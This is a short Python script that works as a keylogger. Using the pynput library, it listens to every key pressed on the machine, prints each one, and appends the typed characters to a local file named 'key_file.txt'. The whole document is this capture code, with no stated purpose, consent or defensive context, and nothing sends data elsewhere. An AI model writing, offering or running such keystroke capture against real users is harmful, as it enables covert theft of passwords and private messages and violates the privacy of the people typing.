import pynput.keyboard

def keyPressed(key):
    print(str(key))
    with open("key_file.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = pynput.keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

